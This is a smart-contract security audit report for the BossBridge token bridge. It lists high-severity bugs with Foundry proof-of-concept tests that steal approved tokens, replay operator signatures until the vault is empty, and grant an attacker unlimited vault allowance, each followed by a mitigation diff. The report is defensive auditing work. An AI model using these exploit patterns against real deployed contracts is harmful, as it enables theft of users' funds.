---
title: Protocol Audit Report
author: Enchanted17
date: October 19, 2025
header-includes:
  - \usepackage{fvextra}
  - \DefineVerbatimEnvironment{Highlighting}{Verbatim}{
      breaklines,commandchars=\\\{\},fontsize=\small,frame=single,rulecolor=\color{gray!30},framesep=3pt
    }
---

\begin{titlepage}
    \newcommand{\HRule}{\rule{\linewidth}{0.5mm}} % 横线样式
    \vspace*{\fill} % 从页面顶部开始往下居中
    \begin{center}
        {\Huge\bfseries BossBridge Audit Report\par}
        \vspace{1cm}
        {\Large \today\par}
    \end{center}
    \vspace*{\fill} % 从标题到底部之间填充剩余空间
\end{titlepage}
\maketitle
  
Prepared by: [Enchanted17](https://github.com/Enchanted17)

Email: luo_dz@163.com
  
# **Table of Contents** 

- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Audit Tools & Environment](#audit-tools--environment)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [[H-1] User who who give tokens approvals may have those assest stolen](#h-1-user-who-who-give-tokens-approvals-may-have-those-assest-stolen)
    - [[H-2] Lack of replay protection allows withdrawals by signature to be replayed](#h-2-lack-of-replay-protection-allows-withdrawals-by-signature-to-be-replayed)
    - [[H-3] Allowing arbitrary calls enables users to give themselves infinite allowance of vault funds](#h-3-allowing-arbitrary-calls-enables-users-to-give-themselves-infinite-allowance-of-vault-funds)
    - [[H-4] Incompatible contract creation on zkSync Era](#h-4-incompatible-contract-creation-on-zksync-era)
  - [Medium](#medium)
  - [Low](#low)
  - [Information](#information)
    - [[I-1] Uncahngable variables should be declared as constant or immutable](#i-1-uncahngable-variables-should-be-declared-as-constant-or-immutable)
    - [[I-2] Function should be declared as internal](#i-2-function-should-be-declared-as-internal)
    - [[I-3] Missing event emission on token withdrawal](#i-3-missing-event-emission-on-token-withdrawal)
- [Additional Recommendations & Code Quality Notes](#additional-recommendations--code-quality-notes)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->



# Disclaimer

This audit does not guarantee the complete absence of vulnerabilities. The findings are based on the reviewed commit and the available information at the time of analysis. We recommend continuous testing and external review before deployment.

# Risk Classification
|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

# Audit Details

The findings described in this document correspond the following commit hash:
```
07af21653ab3e8a8362bf5f63eb058047f562375
```
## Scope
```
#-- src
|   #-- L1BossBridge.sol
|   #-- L1Token.sol
|   #-- L1Vault.sol
|   #-- TokenFactory.sol
```
## Audit Tools & Environment
- Static Analysis:slither, aderyn
- Fuzzing & Testing: Foundry
- Manual Review: VSCode + Hardhat console

# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 4                      |
| Medium   | 0                      |
| Low      | 0                      |
| Info     | 3                      |
| Total    | 7                      |

# Findings

## High
### [H-1] User who who give tokens approvals may have those assest stolen
**Description:** The `L1BossBridge::depositTokensToL2()` function allows anyone to call it with a from address of any account that has approved tokens to the bridge.

As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the l2Recipient parameter).

**Proof of Code:**

As a PoC, include the following test in the `L1BossBridge.t.sol` file:
```javascript
function testCanMoveApprovedTokensFromOtherUser() public{
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);

    address attacker = makeAddr("attacker");
    address attackerInL2 = makeAddr("attackerInL2");
    vm.startPrank(attacker);
    uint256 amount = token.balanceOf(user);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(user, attackerInL2, amount);
    tokenBridge.depositTokensToL2(user, attackerInL2, amount);
    vm.stopPrank();

    assert(token.balanceOf(address(vault)) == amount);
    assert(token.balanceOf(user) == 0);
}
```

**Recommended Mitigation:** Consider modifying the depositTokensToL2 function so that the caller cannot specify a from address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```

### [H-2] Lack of replay protection allows withdrawals by signature to be replayed
**Description:** In `L1BossBridge::withdrawTokensToL1()`, users who want to withdraw tokens from the bridge can call the `sendToL1()` function, or the wrapper `withdrawTokensToL1()` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.

However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces). Therefore, valid signatures from any bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.

**Proof of code:**  As a PoC, include the following test in the `L1TokenBridge.t.sol` file:
```javascript
function testSignatureReplay() public {
    address attacker = makeAddr("attacker");
    address attackerInL2 = makeAddr("attackerInL2");

    uint256 attackerInitBalance = 1e18;
    uint256 vaultInitBalance = 10e18;
    deal(address(token), attacker, attackerInitBalance);
    deal(address(token), address(vault), vaultInitBalance);

    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitBalance);

    (uint8 v, bytes32 r, bytes32 s) =
        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitBalance), operator.key);
    
    while(token.balanceOf(address(vault)) > 0) {
        tokenBridge.withdrawTokensToL1(attacker, attackerInitBalance, v, r, s);
    }

    assert(token.balanceOf(address(vault)) == 0);
    assert(token.balanceOf(attacker) == vaultInitBalance + attackerInitBalance);
}
```

**Recommended Mitigation:** Consider redesigning the withdrawal mechanism so that it includes replay protection.

### [H-3] Allowing arbitrary calls enables users to give themselves infinite allowance of vault funds
**Description:** The L1BossBridge contract includes the sendToL1 function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the L1Vault contract.

The L1BossBridge contract owns the L1Vault contract. Therefore, an attacker could submit a call that targets the vault and executes is approveTo function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.

It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.

**Proof of code:** 
```javascript
function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    address attacker = makeAddr("attacker");
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    bytes memory message = abi.encode(
        address(vault), 
        0, 
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max))
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}
```

**Recommended Mitigation:** Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the L1Vault contract.



### [H-4] Incompatible contract creation on zkSync Era

**Description:** The `TokenFactory::deployToken()` function uses the EVM `CREATE` opcode via inline assembly to deploy new ERC20 contracts:
```javascript
assembly {
    addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
}
```

While this works correctly on Ethereum Mainnet (L1), the zkSync Era network does not support the `CREATE` or `CREATE2` opcodes.
All contract deployments on zkSync must go through the `ContractDeployer` system contract to ensure compatibility with its zk-rollup architecture and bytecode hash verification.

**Impact:**
- The `TokenFactory` will revert when calling `deployToken()` on zkSync Era, making it impossible to deploy new ERC20 tokens on L2.
- This effectively breaks cross-chain deployment consistency, since token deployment will succeed on L1 but fail on zkSync L2.
- In production bridge setups, this would prevent users from minting or withdrawing tokens on zkSync.


**Recommended Mitigation:** Use zkSync’s ContractDeployer system contract to deploy new contracts on L2.
Example fix:
```diff
+ import { IContractDeployer, CONTRACT_DEPLOYER_SYSTEM_CONTRACT } from "@matterlabs/zksync-contracts/l2/system-contracts/ContractDeployer.sol";

function deployToken(string memory symbol, bytes memory contractBytecode) 
    public 
    onlyOwner 
    returns (address addr) 
{
-   assembly {
-       addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
-   }
+   if (block.chainid == 324) { // zkSync Era chain ID
+       IContractDeployer deployer = IContractDeployer(CONTRACT_DEPLOYER_SYSTEM_CONTRACT);
+       addr = deployer.create(0, contractBytecode, "");
+   } else {
+       assembly {
+           addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
+       }
+   }

    require(addr != address(0), "Token deploy failed");
    s_tokenToAddress[symbol] = addr;
    emit TokenDeployed(symbol, addr);
}
```

## Medium

## Low

## Information

### [I-1] Uncahngable variables should be declared as constant or immutable
**Description:** The following variables are never modified after deployment:
1. `L1BossBridge::DEPOSIT_LIMIT` — fixed deposit limit.
2. `L1Vault::token` — token address assigned once during construction.

**Impact:** Storing such values in storage leads to unnecessary gas consumption when reading them, since SLOAD operations are more expensive than accessing constant or immutable variables.

**Recommended Mitigation:** Mark these variables as constant or immutable to reduce gas costs and improve clarity.
```diff
//file L1BossBridge.sol
-   uint256 public DEPOSIT_LIMIT = 100_000 ether;
+   uint256 constant DEPOSIT_LIMIT = 100_000 ether;

// file L1Vault.sol
-    IERC20 public token;
+    IERC20 immutable token;
```

### [I-2] Function should be declared as internal
**Description:** `L1BossBridge::sendToL1()` only called in `withdrawTokensToL1()`, should declared as `internal` to prevent malicious user to called this function with evil message.

**Recommended Mitigation:** 
```diff
-   function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
+   function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) internal nonReentrant whenNotPaused {
```

### [I-3] Missing event emission on token withdrawal
**Description:** The function `L1BossBridge::withdrawTokensToL1()` performs a token withdrawal from L2 to L1 by calling `sendToL1()`, which triggers a cross-chain message execution.
However, the function does not emit any event when a withdrawal occurs.

Without an event, off-chain indexers, bridges, or monitoring services have no reliable way to detect or verify when a withdrawal has been initiated.
This reduces the auditability and transparency of bridge activity and may cause synchronization issues between L1 and L2.

**Impact:**
- Lack of on-chain traceability for user withdrawals.
- Off-chain relayers or monitoring systems cannot automatically detect when users initiate withdrawals.
- Reduces security visibility and may cause discrepancies between L1 and L2 token balances.
- In extreme cases, users may not be able to prove a withdrawal occurred if a transaction is lost or delayed cross-chain.

**Recommended Mitigation:** Emit an event whenever a token withdrawal to L1 is initiated.
This allows off-chain components and auditors to track all withdrawals easily.

# Additional Recommendations & Code Quality Notes
- Improve test coverage. Aim to get test coverage up to over 90% for all files.